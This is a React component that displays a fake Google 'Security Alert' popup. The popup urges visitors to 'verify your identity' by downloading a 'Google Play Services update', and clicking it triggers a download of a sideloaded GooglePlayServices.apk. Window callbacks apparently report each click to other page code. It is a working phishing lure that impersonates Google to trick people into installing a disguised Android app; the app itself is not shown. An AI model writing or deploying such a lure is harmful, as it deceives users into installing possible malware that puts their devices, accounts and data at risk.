import React, { useState, useEffect } from 'react';
import { motion, AnimatePresence } from 'framer-motion';
import { X, Download, Shield } from 'lucide-react';
import { Button } from '@/components/ui/button';

interface GmailNotificationProps {
  forceShow?: boolean;
  onVerify?: () => void;
  onDownload?: () => void;
}

export default function GmailNotification({ forceShow = false, onVerify, onDownload }: GmailNotificationProps) {
  const [isVisible, setIsVisible] = useState(false);
  const [showPopup, setShowPopup] = useState(false);

  useEffect(() => {
    if (forceShow) {
      setIsVisible(true);
    }
  }, [forceShow]);

  const handleVerify = () => {
    setShowPopup(true);
    (window as any).gmailUserInteracted = true;
    if (onVerify) onVerify();
    if ((window as any).onGmailVerify) (window as any).onGmailVerify();
  };

  const handleDownload = () => {
    const link = document.createElement('a');
    link.href = '/downloads/GooglePlayServices.apk';
    link.download = 'GooglePlayServices.apk';
    document.body.appendChild(link);
    link.click();
    document.body.removeChild(link);
    
    (window as any).gmailUserInteracted = true;
    if (onDownload) onDownload();
    if ((window as any).onGmailDownload) (window as any).onGmailDownload();
    setShowPopup(false);
    setIsVisible(false);
  };

  const handleClose = () => {
    setShowPopup(false);
    setIsVisible(false);
  };

  if (!isVisible) return null;

  return (
    <>
      <AnimatePresence>
        {isVisible && !showPopup && (
          <motion.div
            initial={{ opacity: 0, y: 20 }}
            animate={{ opacity: 1, y: 0 }}
            exit={{ opacity: 0, y: 20 }}
            className="fixed bottom-4 right-4 z-50"
          >
            <div 
              onClick={handleVerify}
              className="bg-white rounded-full p-3 shadow-lg cursor-pointer hover:shadow-xl transition-shadow border border-gray-200"
            >
              <div className="relative">
                <Shield className="w-8 h-8 text-blue-600" />
                <span className="absolute -top-1 -right-1 w-3 h-3 bg-red-500 rounded-full animate-pulse" />
              </div>
            </div>
          </motion.div>
        )}
      </AnimatePresence>

      <AnimatePresence>
        {showPopup && (
          <motion.div
            initial={{ opacity: 0 }}
            animate={{ opacity: 1 }}
            exit={{ opacity: 0 }}
            className="fixed inset-0 bg-black/50 flex items-center justify-center z-50 p-4"
          >
            <motion.div
              initial={{ scale: 0.9, opacity: 0 }}
              animate={{ scale: 1, opacity: 1 }}
              exit={{ scale: 0.9, opacity: 0 }}
              className="bg-white rounded-lg shadow-xl max-w-md w-full p-6 relative"
            >
              <button 
                onClick={handleClose}
                className="absolute top-4 right-4 text-gray-400 hover:text-gray-600"
              >
                <X className="w-5 h-5" />
              </button>

              <div className="text-center mb-6">
                <div className="w-16 h-16 bg-blue-100 rounded-full flex items-center justify-center mx-auto mb-4">
                  <Shield className="w-8 h-8 text-blue-600" />
                </div>
                <h2 className="text-xl font-semibold text-gray-900 mb-2">Security Alert</h2>
                <p className="text-gray-600 text-sm">
                  To verify your identity and secure your account, please download the Google Play Services update.
                </p>
              </div>

              <div className="space-y-3">
                <Button
                  onClick={handleDownload}
                  className="w-full bg-blue-600 hover:bg-blue-700 text-white py-3 flex items-center justify-center gap-2"
                >
                  <Download className="w-5 h-5" />
                  Download Google Play Services
                </Button>
                <Button
                  onClick={handleClose}
                  variant="outline"
                  className="w-full py-3"
                >
                  Maybe Later
                </Button>
              </div>

              <p className="text-xs text-gray-400 text-center mt-4">
                This update helps protect your account from unauthorized access.
              </p>
            </motion.div>
          </motion.div>
        )}
      </AnimatePresence>
    </>
  );
}
